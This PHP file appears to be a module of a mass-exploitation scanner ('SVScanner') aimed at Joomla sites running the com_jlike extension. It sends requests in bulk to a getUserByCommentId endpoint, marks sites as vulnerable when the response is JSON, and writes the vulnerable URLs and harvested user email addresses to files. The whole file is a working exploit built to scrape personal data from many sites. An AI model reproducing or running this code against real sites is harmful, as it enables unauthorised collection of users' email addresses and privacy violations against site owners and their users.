<?php
error_reporting(0);
/**
 * @Author: Eka Syahwan
 * @Date:   2018-09-06 23:02:10
 * @Last Modified by:   shor7cut
 * @Last Modified time: 2018-09-16 14:17:10
 */
class Exploit_jLike
{
	function __construct()
	{
		$this->wploit_modules 	= new wploit_modules;
		$this->sdata 			= new Sdata;
		$this->database 		= new Database;
	}
	function scanner($array_url , $datcommand){
		##########################################################################
		mkdir("result");
		mkdir("result/exploit");
		mkdir("result/exploit/joomla");
		$fopn = fopen("result/exploit/joomla/Jlike-url.txt", "a+");
		$fopns = fopen("result/exploit/joomla/Jlike-dumpEmail.txt", "a+");
		##########################################################################
		echo "\r\n".$this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","Trying exploits ... [ ".count($array_url)." Request | ".$datcommand."]\r\n");
		foreach ($array_url as $key => $dataURL) {
			$url[] =  array('url' 		=> $dataURL['url']."/index.php?option=com_jlike&task=getUserByCommentId&tmpl=component&format=row");
			$hea[] =  array('follow' 	=> false);
		}
		$respons   = $this->sdata->sdata($url,$hea); $this->sdata->session_remove($respons); unset($url);unset($hea);
		foreach ($respons as $key => $value) {
			$_SESSION['total_size'] = ($_SESSION['total_size']+$value['info']['size']);
			$_SESSION['temp_size']  = ($_SESSION['temp_size']+$value['info']['size']);

			$json = json_decode($value['respons'],true);
			
			if($json == NULL){
				echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("red","[".$value['info']['http_code']."] ".$value['info']['url'])." => ".$this->wploit_modules->color("red","[ NOT VULN ]")."\r\n";
			}else{
				echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("nevy","[".$value['info']['http_code']."] ".$value['info']['url'])." => ".$this->wploit_modules->color("green","[ VULN ]")."\r\n";
				$_SESSION['vuln'] 	= ($_SESSION['vuln']+1);
				fwrite($fopn, $value['info']['url']."\r\n");

				foreach ($json as $key => $emailData) {
					echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("green","Found Email : ".$emailData['email'])."\r\n";
					fwrite($fopns, $emailData['email']."\r\n");
					$_SESSION['email'] = ($_SESSION['email']+1);
				}

			}
		}

		echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","[ Download Size : ".$this->wploit_modules->formatSizeUnits($_SESSION['temp_size'])." | Total Download : ".$this->wploit_modules->formatSizeUnits($_SESSION['total_size']).")\r\n");
		echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("nevy","[Total Email]")." ".$this->wploit_modules->color("green",$_SESSION['vuln'])."\r\n";
		echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("nevy","[Total VuLn]")."  ".$this->wploit_modules->color("green",$_SESSION['email'])."\r\n";

		fclose($fopn);fclose($fopns);
		unset($_SESSION['temp_size']);
	}
}